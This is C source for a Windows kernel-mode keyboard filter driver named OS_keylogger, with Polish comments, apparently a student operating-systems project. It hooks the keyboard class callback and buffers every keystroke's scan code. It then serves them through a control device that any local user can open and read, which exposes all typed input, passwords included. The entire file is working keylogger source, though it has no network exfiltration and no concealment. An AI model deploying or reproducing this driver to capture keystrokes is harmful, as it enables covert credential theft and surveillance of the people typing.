#include <ntddk.h>
#include <wdf.h>

#include<ntddkbd.h>
#include <kbdmou.h>
#include<wdmsec.h>

#include"../Shared.h"

#define BUFFER_SIZE 1024

typedef struct _DEVICE_CONTEXT_ {
    CONNECT_DATA UpperConnectData;
} DEVICE_CONTEXT, * PDEVICE_CONTEXT;

typedef struct _DRIVER_CONTEXT {
    KEY_EVENT_DATA buffer[BUFFER_SIZE];
    ULONG Head;
    ULONG Tail;
    WDFSPINLOCK BufferLock;

    WDFQUEUE AppQueue;
} DRIVER_CONTEXT, * PDRIVER_CONTEXT;

WDF_DECLARE_CONTEXT_TYPE(DRIVER_CONTEXT)
WDF_DECLARE_CONTEXT_TYPE(DEVICE_CONTEXT)


DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD OS_keyloggerEvtDeviceAdd;
EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL OS_keyloggerInternalDeviceControl;
VOID
OS_keyloggerCallback(
    _In_    PDEVICE_OBJECT       DeviceObject,
    _In_    PKEYBOARD_INPUT_DATA InputDataStart,
    _In_    PKEYBOARD_INPUT_DATA InputDataEnd,
    _Inout_ PULONG               InputDataConsumed
);
VOID AppQueueProcess(PDRIVER_CONTEXT context);
NTSTATUS CreateControllDevice(WDFDRIVER Driver);



NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT     DriverObject,
    _In_ PUNICODE_STRING    RegistryPath
)
{
    // NTSTATUS variable to record success or failure
    NTSTATUS status = STATUS_SUCCESS;

    // Allocate the driver configuration object
    WDF_DRIVER_CONFIG config;

    // Print "Hello World" for DriverEntry
    DbgPrint("OS_keylogger: DriverEntry\n");

    // Initialize the driver configuration object to register the
    // entry point for the EvtDeviceAdd callback
    WDF_DRIVER_CONFIG_INIT(&config,
        OS_keyloggerEvtDeviceAdd
    );

    //dodanie kontekstu do ca³ego sterownika(wspólnego miêdzy urz¹dzeniami filtra  i kontrolnym)
    WDF_OBJECT_ATTRIBUTES attributes;
    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&attributes, DRIVER_CONTEXT);

    WDFDRIVER driver;
    // Finally, create the driver object
    status = WdfDriverCreate(DriverObject,
        RegistryPath,
        &attributes,
        &config,
        &driver
    );

    CreateControllDevice(driver);


    return status;
}

NTSTATUS
OS_keyloggerEvtDeviceAdd(
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
)
{
    // We're not using the driver object,
    // so we need to mark it as unreferenced
    UNREFERENCED_PARAMETER(Driver);

    NTSTATUS status;
    WDF_OBJECT_ATTRIBUTES wdfObjectAttr;
    WDFDEVICE wdfDevice;

    DbgPrint("OS_keylogger: OS_keyloggerEvtDeviceAdd\n");

    // oznaczamy sterownik jako filtr
    WdfFdoInitSetFilter(DeviceInit);
    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_UNKNOWN);

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&wdfObjectAttr, DEVICE_CONTEXT);
    // Create the device object
    status = WdfDeviceCreate(&DeviceInit,
        &wdfObjectAttr,
        &wdfDevice
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfDeviceCreate failed with status 0x%x\n", status);
        return status;
    }

    //tworzenie kolejki
    WDF_IO_QUEUE_CONFIG queueConfig;
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig,
        WdfIoQueueDispatchParallel);

    queueConfig.EvtIoInternalDeviceControl = OS_keyloggerInternalDeviceControl;

    status = WdfIoQueueCreate(wdfDevice,
        &queueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        WDF_NO_HANDLE
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfIoQueueCreate failed with status 0x%x\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}

VOID
OS_keyloggerInternalDeviceControl(
    WDFQUEUE    Queue,
    WDFREQUEST  Request,
    size_t      OutputBufferLength,
    size_t      InputBufferLength,
    ULONG       IoControlCode
)
{
    UNREFERENCED_PARAMETER(OutputBufferLength);

    DbgPrint("OS_keylogger: InternalDeviceControl\n");

    NTSTATUS status;
    PCONNECT_DATA connectData;
    size_t length;

    WDFDEVICE device;
    PDEVICE_CONTEXT deviceContext;

    WDF_REQUEST_SEND_OPTIONS options;
    WDFIOTARGET target;
    BOOLEAN ret;

    //odczytujemy device i kontekst 
    device = WdfIoQueueGetDevice(Queue);
    deviceContext = WdfObjectGet_DEVICE_CONTEXT(device);

    switch (IoControlCode) {

    case IOCTL_INTERNAL_KEYBOARD_CONNECT:
        //sprawdzamy, czy bufor ma poprawny rozmiar
        if (InputBufferLength < sizeof(CONNECT_DATA))
        {
            DbgPrint("OS_keylogger: Z³y rozmiar bufora!\n");
            WdfRequestComplete(Request, STATUS_INVALID_PARAMETER);
            return;
        }

        status = WdfRequestRetrieveInputBuffer(Request, sizeof(CONNECT_DATA), (PVOID*)&connectData, &length);
        if (!NT_SUCCESS(status))
        {
            DbgPrint("Os_keylogger: WdfRequestRetrieveInputBuffer failed with status 0x%x\n", status);
            WdfRequestComplete(Request, status);
            return;
        }

        deviceContext->UpperConnectData = *connectData;
        connectData->ClassService = (PVOID)OS_keyloggerCallback;
        connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);

        DbgPrint("OS_keylogger: Hook installed\n");

    default:

        WdfRequestFormatRequestUsingCurrentType(Request);

        target = WdfDeviceGetIoTarget(device);

        WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

        ret = WdfRequestSend(Request, target, &options);

        if (ret == FALSE)
        {
            status = WdfRequestGetStatus(Request);
            DbgPrint("OS_keylogger: WdfRequestSend failed: 0x%x\n", status);
            WdfRequestComplete(Request, status);
        }
    }
}

VOID
OS_keyloggerCallback(
    _In_    PDEVICE_OBJECT       DeviceObject,
    _In_    PKEYBOARD_INPUT_DATA InputDataStart,
    _In_    PKEYBOARD_INPUT_DATA InputDataEnd,
    _Inout_ PULONG               InputDataConsumed
)
{ 
    UNREFERENCED_PARAMETER(DeviceObject);
    //DbgPrint("OS_keylogger: callback\n");

    WDFDEVICE wdfDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
    WDFDRIVER wdfDriver = WdfDeviceGetDriver(wdfDevice);
    PDEVICE_CONTEXT deviceContext = WdfObjectGet_DEVICE_CONTEXT(wdfDevice);
    PDRIVER_CONTEXT driverContext = WdfObjectGet_DRIVER_CONTEXT(wdfDriver);

    if (!deviceContext || !deviceContext->UpperConnectData.ClassService) {
        // jeœli po nas nikogo nie ma zdejmujemy pakiety
        *InputDataConsumed = (ULONG)(InputDataEnd - InputDataStart);
        return;
    }

    PKEYBOARD_INPUT_DATA currentPacket;

    for (currentPacket = InputDataStart; currentPacket < InputDataEnd; currentPacket++) {
            DbgPrint("OS_keylogger: key pressed ScanCode: 0x%02X | Flags: 0x%X\n",
                currentPacket->MakeCode,
                currentPacket->Flags);

            WdfSpinLockAcquire(driverContext->BufferLock);
            ULONG nextTail = (driverContext->Tail + 1) % BUFFER_SIZE;

            if (nextTail != driverContext->Head) {
                driverContext->buffer[nextTail].MakeCode = currentPacket->MakeCode;
                driverContext->buffer[nextTail].Flags = currentPacket->Flags;
                
                driverContext->Tail = nextTail;
            }
            else{
                DbgPrint("OS_keylogger: buffer overflow\n");
            }

            WdfSpinLockRelease(driverContext->BufferLock);
    }

    //Wywo³anie nastêpnej funkcji
    PSERVICE_CALLBACK_ROUTINE upperService = (PSERVICE_CALLBACK_ROUTINE)deviceContext->UpperConnectData.ClassService;

    if (upperService)
    {
        upperService(
            deviceContext->UpperConnectData.ClassDeviceObject,
            InputDataStart,
            InputDataEnd,
            InputDataConsumed
            );
    }

    //próba przes³ania do user mode
    AppQueueProcess(driverContext);
}


//To jest wo³ane gdy pojawi¹ siê nowe requesty z user mode
VOID
ControlEvtIoDeviceControl(
    _In_ WDFQUEUE Queue,
    _In_ WDFREQUEST Request,
    _In_ size_t OutputBufferLength,
    _In_ size_t InputBufferLength,
    _In_ ULONG IoControlCode
)
{
    UNREFERENCED_PARAMETER(InputBufferLength);

    PDRIVER_CONTEXT driverContext = WdfObjectGet_DRIVER_CONTEXT(WdfDeviceGetDriver(WdfIoQueueGetDevice(Queue)));
    NTSTATUS status;

    DbgPrint("OS_keylogger: ControlEvtIoDeviceControl\n");

    switch (IoControlCode)
    {
    case IOCTL_GET_KEY_EVENT: //zdefiniowane w Shared.h

        //sprawdzenie czy bufor wystarczaj¹cy
        if (OutputBufferLength < sizeof(KEY_EVENT_DATA)) {
            WdfRequestComplete(Request, STATUS_BUFFER_TOO_SMALL);
            return;
        }

        //przekazanie rz¹dania do kontekstu
        status = WdfRequestForwardToIoQueue(Request, driverContext->AppQueue);

        if (!NT_SUCCESS(status)) {
            DbgPrint("OS_keylogger: Request forward failed with status: 0x%x\n", status);
            WdfRequestComplete(Request, status);
        }

        //próba pobrania danych z bufora
        AppQueueProcess(driverContext);

        return;

    default:
        DbgPrint("OS_keylogger: invalid request\n");
        WdfRequestComplete(Request, STATUS_INVALID_DEVICE_REQUEST);
        break;
    }
}

VOID
AppQueueProcess(PDRIVER_CONTEXT context) {
    NTSTATUS status;
    WDFREQUEST request;
    PKEY_EVENT_DATA buffer;
    size_t length;

    DbgPrint("OS_keylogger: app queue process\n");

    while (1) {
        status = WdfIoQueueRetrieveNextRequest(context->AppQueue, &request);

        if (!NT_SUCCESS(status)) {
            DbgPrint("OS_keylogger: no requests\n");
            //brak rz¹dañ
            break;
        }

        status = WdfRequestRetrieveOutputBuffer(request, sizeof(KEY_EVENT_DATA), (PVOID*)&buffer, &length);
        
        if (!NT_SUCCESS(status)) {
            DbgPrint("Os_keylogger: coldnt retrieve output buffer\n");
            WdfRequestComplete(request, status);
            continue;
        }

        WdfSpinLockAcquire(context->BufferLock);

        if (context->Head != context->Tail) {
            //jeœli bufor nie jest pusty zdejmujemy klawisz i wysy³amy do aplikacji
            *buffer = context->buffer[context->Head];

            context->Head = (context->Head + 1) % BUFFER_SIZE;

            WdfSpinLockRelease(context->BufferLock);
            WdfRequestCompleteWithInformation(request, STATUS_SUCCESS, sizeof(KEY_EVENT_DATA));
            DbgPrint("Os_keylogger: request completed\n");
        }
        else {
            DbgPrint("OS_keylogger: buffer empty\n");
            //jeœli bufor jest pusty odk³adamy request spowrotem do kolejki
            WdfSpinLockRelease(context->BufferLock);
            WdfRequestForwardToIoQueue(request, context->AppQueue);
            break;
        }
    }
}

NTSTATUS
CreateControllDevice(WDFDRIVER Driver) {
    NTSTATUS status;
    WDFDEVICE device;
    PWDFDEVICE_INIT pInit;

    UNICODE_STRING devName, symLink;

    //Tworzenie urz¹dzenia
    RtlInitUnicodeString(&devName,
        L"\\Device\\OS_keyloggerControl");


    pInit = WdfControlDeviceInitAllocate(
        Driver,
        &SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RW_RES_R
    );

    status = WdfDeviceInitAssignName(pInit, &devName);
    if (!NT_SUCCESS(status)) {
        WdfDeviceInitFree(pInit);
        return status;
    }

    WdfDeviceInitSetDeviceType(
        pInit,
        FILE_DEVICE_UNKNOWN
    );

    WdfDeviceInitSetCharacteristics(
        pInit,
        FILE_DEVICE_SECURE_OPEN,
        FALSE
    );

    status = WdfDeviceCreate(
        &pInit,
        WDF_NO_OBJECT_ATTRIBUTES,
        &device
    );
    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: Controll device ccreate failed with status:  0x%x\n", status);
        return status;
    }

    //Tworzenie linku
    RtlInitUnicodeString(&symLink,
        L"\\DosDevices\\OS_keyloggerLink");

    status = WdfDeviceCreateSymbolicLink(
        device,
        &symLink
    );
    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: sym link create failed with status:  0x%x\n", status);
        return status;
    }

    //Tworzenie kolejki przyjmuj¹cej rz¹dania z user mode
    WDF_IO_QUEUE_CONFIG queueConfig;
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig, WdfIoQueueDispatchParallel);

    queueConfig.EvtIoDeviceControl = ControlEvtIoDeviceControl;

    status = WdfIoQueueCreate(
        device,
        &queueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: control queue create failed with status  0x%x\n", status);
        return status;
    }

    //inicjalizacja bufora na klawisze
    PDRIVER_CONTEXT context = WdfObjectGet_DRIVER_CONTEXT(Driver);

    context->Head = 0;
    context->Tail = 0;

    status = WdfSpinLockCreate(WDF_NO_OBJECT_ATTRIBUTES, &context->BufferLock);
    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfSpinLockCreate failed with status 0x%x\n", status);
        return status;
    }

    //kolejka do przekazywania requestów miêdzu urz¹dzeniami filtra i control
    WDF_IO_QUEUE_CONFIG_INIT(&queueConfig,
        WdfIoQueueDispatchManual);

    status = WdfIoQueueCreate(device,
        &queueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        &context->AppQueue
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfIoQueueCreate AppQueue failed with status 0x%x\n", status);
        return status;
    }

    WdfControlFinishInitializing(device);

    return STATUS_SUCCESS;
}